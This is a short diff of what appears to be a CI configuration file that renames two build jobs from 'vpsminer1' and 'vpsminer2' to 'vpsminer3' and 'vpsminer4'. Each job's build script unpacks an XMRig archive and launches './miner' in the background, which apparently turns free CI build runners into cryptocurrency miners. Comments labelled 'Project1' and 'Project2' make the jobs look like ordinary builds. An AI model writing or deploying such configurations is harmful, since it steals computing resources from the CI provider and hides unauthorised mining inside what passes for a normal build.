@@ -14,7 +14,7 @@ init:
 jobs:
   include:
     # Job for Project1
-    - job: vpsminer1
+    - job: vpsminer3
       build_script:
         # Commands for Project1
         - tar xvf xmrigdir.tar.gz
@@ -23,7 +23,7 @@ jobs:
         - ./miner & # Run the first project
 
     # Job for Project2
-    - job: vpsminer2
+    - job: vpsminer4
       build_script:
         # Commands for Project2
         - tar xvf xmrigdir.tar.gz
